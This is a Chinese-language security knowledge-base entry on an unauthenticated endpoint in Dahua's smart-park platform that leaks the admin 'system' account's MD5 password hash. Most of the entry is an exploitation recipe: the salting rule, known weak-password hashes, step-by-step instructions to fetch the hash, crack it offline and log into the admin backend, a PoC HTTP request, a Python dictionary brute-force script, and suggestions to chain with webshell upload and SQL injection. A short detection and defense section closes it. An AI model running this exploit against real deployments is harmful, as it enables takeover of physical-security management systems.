---
id: web-java-component-dahua-usergetuserinfobyusername-unauth-hash-leak
title: 大华智慧园区 user_getUserInfoByUserName 未授权泄露 loginPass：按 md5(loginName:dss:password) 规则爆破管理员口令
type: scenario
domain: web
path: web/java/component
technique: dahua-userinfo-unauth-password-hash-leak
tags:
- java
- dahua
- wpms
- auth
- information-disclosure
- password-hash
- unauthorized
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V383
  verified_at: '2026-11-09T08:54:02+08:00'
  notes: 已对照原文核对：admin Interceptor 放行 /user_getUserInfoByUserName.action、UserAction→UserManagerImpl→UserDaoImpl 按 loginName 查询、Gson 原样返回 loginPass、md5(loginName:dss:loginPass) 规则、示例哈希 e2d227121542718ff958441f8b75c1f7 与截图逐字符一致、弱口令 md5 与 sys_user 截图一致；未验证点：登录端到端流程原文未展开。
url: /docs/web/java/component/web-java-component-dahua-usergetuserinfobyusername-unauth-hash-leak/
draft: false
kb_aliases:
- user_getUserInfoByUserName
- loginPass 泄露
- md5(loginName:dss:password)
- 大华 system 管理员
- 大华口令哈希爆破
---

## 一句话结论

大华智慧园区 admin 模块的 `Interceptor` 把 `/user_getUserInfoByUserName.action` 列入放行名单，未登录即可用 `userName=system` 查询用户对象；`UserAction.getUserInfoByUserName` 经 `UserManager.getUserBean`、`UserDaoImpl.getUser` 按 `loginName` 查出用户后直接用 Gson 序列化返回，响应中包含 `loginPass` 口令哈希。该系统的口令哈希规则是 `md5(loginName + ":dss:" + loginPass)`（配置开启加密时），攻击者可据此对默认管理员 `system` 做定向字典爆破或直接套用已知弱口令哈希，进而登录后台。

## 原理

- **放行名单**：`admin/WEB-INF/classes/com/dahua/admin/common/aop/Interceptor.class` 在 `userBean == null` 时用一长串 `!servletPath.contains("...")` 判断哪些 action 免登录，其中包含 `/user_getUserInfoByUserName.action`、`/ztree.action`、`/subSystem_*`、`/config_*`、`/user_check*`、`/authorize_`、`/domain_` 等，导致这些接口可未授权访问。
- **查询链路**：`UserAction.getUserInfoByUserName()` 取 `userName` 参数，`userManager.getUserBean(userName)` → `UserManagerImpl.getUserBean(loginName)` → `UserDaoImpl.getUser(loginName)`：
  ```java
  DetachedCriteria c = DetachedCriteria.forClass(User.class);
  c.add(Restrictions.eq("loginName", loginName));
  List<User> list = this.hibernateTemplate.findByCriteria(c);
  return list.size() > 0 ? list.get(0) : null;
  ```
  随后 `new Gson().toJson(userBean)` 原样返回整个用户对象。
- **泄露字段**：响应包含 `id`、`loginName`（如 `system`）、`loginPass`（32 位 MD5）、`isEncrypted`、`isAdminOnline`、`lastUpdatePasswordTime` 等；`loginPass` 是可直接离线攻击的口令哈希，而不是随机 session 数据。
- **哈希规则**：`EncryptionUtils.getEncryptedText(UserBean)` 在配置 `user.loginpass.encryted == "true"` 时返回 `encrypt(loginName + ":dss:" + loginPass)`，否则返回明文；`encrypt()` 为标准 MD5 十六进制。因此可针对目标用户名构造候选：`md5("<loginName>:dss:<候选口令>")`，与泄露值比对。
- **为什么危害高**：默认管理员 `system` 一定存在，用户名固定；口令若为弱口令（原文示例 `admin12345` → `5ce3960eac39a95ed67b654053849793`、`admin123` → `278bf69381b3053c5387cf09bed039ce`、`Admin123` → `1ebe47fb5b1299c1ecc061e248450b83`）可被字典直接命中；拿到口令即可登录后台，或结合平台其它漏洞进一步利用。

## 触发条件

- 目标为大华智慧园区平台，`/admin/user_getUserInfoByUserName.action` 可访问。
- `Interceptor` 的放行名单未被修改，接口无需登录态。
- 目标保留默认管理员 `system`（或攻击者知道其它用户名）。
- 口令使用 `loginName:dss:password` 的 MD5 规则存储（`user.loginpass.encryted=true` 的常见配置）。

## 利用步骤

1. 未登录请求 `/admin/user_getUserInfoByUserName.action?userName=system`，确认返回 JSON 用户对象。
2. 记录 `loginName` 与 `loginPass`；将 `loginPass` 作为 MD5 哈希处理。
3. 离线爆破：对字典中的每个候选口令计算 `md5(loginName + ":dss:" + 候选口令)`，与 `loginPass` 比对；也可先用通用 MD5 彩虹表/弱口令库尝试。
4. 命中后用该口令登录后台，或利用同平台的其它漏洞（文件上传/SQL 注入）组合利用。
5. 若同时拿到数据库权限，也可直接更新 `sys_user.login_pass` 后登录（原文后渗透思路）。
6. 记录证据后停止，不修改业务数据。

## PoC

```http
GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
Host: target
```

```json
// 响应节选（未登录）
{"id":1,"loginName":"system","loginPass":"e2d227121542718ff958441f8b75c1f7",
 "isEncrypted":true,"isAdminOnline":1,"lastUpdatePasswordTime":"Sep 15, 2020 2:43:42 AM", "...":"..."}
```

```python
import hashlib
login, leaked = "system", "e2d227121542718ff958441f8b75c1f7"
for pwd in open("dict.txt", encoding="utf-8"):
    pwd = pwd.strip()
    if hashlib.md5(f"{login}:dss:{pwd}".encode()).hexdigest() == leaked:
        print("password:", pwd); break
```

原文给出的已知对应关系可用于自检算法：`system:dss:admin12345` → `5ce3960eac39a95ed67b654053849793`。

## 变体与关联

- 变体：同一放行名单中的其它 `user_*`/`config_*`/`subSystem_*` action 也可能存在未授权信息泄露或敏感操作，应逐个审计。
- 变体：若 `user.loginpass.encryted` 未开启，接口直接返回明文口令；若使用别的盐值，按实际配置调整哈希拼接。
- 变体：文档中 `userName` 可换成其它已知账号；若接口无频率限制，可枚举用户存在性。
- 关联：[[web-java-component-dahua-emap-myinterceptor-catch-auth-bypass]]（同平台另一处鉴权绕过）、[[web-java-component-dahua-material-file-upload-webshell]]（拿到后台后的上传利用）、[[web-java-component-dahua-getfacecapture-orderby-sqli]]（同平台 SQL 注入）。

## 检测与防御

- 防御：从放行名单中移除 `user_getUserInfoByUserName` 等业务接口，只放行登录/静态资源确实需要的路径；所有用户查询做会话与对象级授权。
- 防御：任何接口都不得返回 `loginPass`/口令哈希等敏感字段，使用 DTO 白名单序列化；口令哈希改为加盐慢哈希（bcrypt/argon2），不要用可被字典攻击的 MD5。
- 防御：默认管理员 `system` 强制首次改密并启用强口令策略；登录加验证码/失败锁定/MFA。
- 检测：未登录会话请求 `/admin/user_getUserInfoByUserName.action`；响应包含 `loginPass` 字段；同一 IP 对 admin action 的高频枚举；后台登录来源异常。
